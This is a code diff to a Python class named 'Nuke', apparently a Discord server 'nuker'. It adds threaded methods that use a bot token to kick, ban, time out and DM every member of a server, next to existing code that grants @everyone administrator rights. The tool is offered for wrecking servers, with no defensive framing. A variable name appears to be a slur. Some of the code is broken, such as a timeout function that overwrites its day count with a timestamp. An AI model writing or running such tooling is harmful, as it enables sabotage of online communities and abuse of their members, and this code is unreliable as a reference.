@@ -4,6 +4,7 @@ import json
 import os
 import time
 import base64
+from datetime import datetime, timedelta, timezone
 
 from shi.console import *
 
@@ -371,30 +372,125 @@ class Nuke:
         except Exception as e:
             Logging.fail(f'Failed to give @everyone admin: {e}')
             
-    def ban(self, serverid, userid):
-        payload = {'delete_message_seconds': 0}
-        try:
-            r = requests.put(f'https://discord.com/api/v9/guilds/{serverid}/bans/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
-            if r.status_code in [200, 201, 204]:
-                Logging.success(f'Banned {userid}')
-            elif r.status_code == 429:
-                Logging.info(f'Rate limit response while trying to ban {userid}')
-            else:
-                Logging.fail(f'Failed to ban {userid}: {r.status_code} - {r.text}')
-        except Exception as e:
-            Logging.fail(f'Failed to ban {userid}: {e}')
     
-    def kick(self, serverid, userid):
-        try:
-            r = requests.delete(f'https://discord.com/api/v9/guilds/{serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
-            if r.status_code in [200, 201, 204]:
-                Logging.success(f'Banned {userid}')
-            elif r.status_code == 429:
-                Logging.info(f'Rate limit response while trying to ban {userid}')
-            else:
-                Logging.fail(f'Failed to ban {userid}: {r.status_code} - {r.text}')
-        except Exception as e:
-            Logging.fail(f'Failed to ban {userid}: {e}')
     
-    def KickAll(self, userid):
-        ''
+    def timeout(self, userid, days):
+        days = (datetime.now(timezone.utc) + timedelta(days=days)).isoformat()
+        payload = {
+        "communication_disabled_until": days
+        }
+        try:
+            r = requests.patch(f'https://discord.com/api/v9/guilds/{self.serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+            st = 'days' if days != 1 else 'day'
+            if r.status_code in [200, 201, 204]:
+                Logging.success(f'Successfully timed out {userid} for {days} {st}')
+            elif r.status_code == 429:
+                Logging.info(f'Rate limit response while trying to time out {userid} for {days} {st}')
+            else:
+                Logging.fail(f'Failed to time out {userid} for {days} {st}: {r.status_code}, {r.text}')
+        except Exception as e:
+            Logging.fail(f'Failed to time out {userid} for {days} {st}: {e}')
+
+    def dm(self, userid):
+        'wip'
+        
+    def KickAll(self):
+        members = []
+        threads = []
+        payload = {'limit': 1000}
+        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
+        m = nig.json()
+        for mem in m:
+            id = mem['user']['id']
+            members.append(id)
+            
+        def kick(userid):
+            try:
+                r = requests.delete(f'https://discord.com/api/v9/guilds/{self.serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+                if r.status_code in [200, 201, 204]:
+                    Logging.success(f'Banned {userid}')
+                elif r.status_code == 429:
+                    Logging.info(f'Rate limit response while trying to ban {userid}')
+                else:
+                    Logging.fail(f'Failed to ban {userid}: {r.status_code} - {r.text}')
+            except Exception as e:
+                Logging.fail(f'Failed to ban {userid}: {e}')
+
+        for member in members:
+            t = threading.Thread(target=kick, args=(member,))
+            threads.append(t)
+            t.start()
+            time.sleep(0.01)
+        
+        for t in threads:
+            t.join()
+
+    def BanAll(self):
+        members = []
+        threads = []
+        payload = {'limit': 1000}
+        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
+        m = nig.json()
+        for mem in m:
+            id = mem['user']['id']
+            members.append(id)
+            
+        def ban(userid):
+            payload = {'delete_message_seconds': 0}
+            try:
+                r = requests.put(f'https://discord.com/api/v9/guilds/{self.serverid}/bans/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+                if r.status_code in [200, 201, 204]:
+                    Logging.success(f'Banned {userid}')
+                elif r.status_code == 429:
+                    Logging.info(f'Rate limit response while trying to ban {userid}')
+                else:
+                    Logging.fail(f'Failed to ban {userid}: {r.status_code} - {r.text}')
+            except Exception as e:
+                Logging.fail(f'Failed to ban {userid}: {e}')   
+                
+        for member in members:
+            t = threading.Thread(target=ban, args=(member,))
+            threads.append(t)
+            t.start()
+            time.sleep(0.01)
+        
+        for t in threads:
+            t.join()        
+            
+    def TimeoutAll(self, days):
+        members = []
+        threads = []
+        payload = {'limit': 1000}
+        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
+        m = nig.json()
+        for mem in m:
+            id = mem['user']['id']
+            members.append(id)
+    
+        for member in members:
+            t = threading.Thread(target=self.timeout, args=(member, days,))
+            threads.append(t)
+            t.start()
+            time.sleep(0.01)
+        
+        for t in threads:
+            t.join()        
+
+    def DMAll(self):
+        members = []
+        threads = []
+        payload = {'limit': 1000}
+        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
+        m = nig.json()
+        for mem in m:
+            id = mem['user']['id']
+            members.append(id)
+    
+        for member in members:
+            t = threading.Thread(target=self.dm, args=(self.serverid, member,))
+            threads.append(t)
+            t.start()
+            time.sleep(0.01)
+        
+        for t in threads:
+            t.join()        
